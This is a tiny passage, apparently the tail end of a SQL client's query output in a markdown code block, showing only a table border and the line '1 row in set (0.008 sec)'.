+----+-------+------------------+
1 row in set (0.008 sec)
```
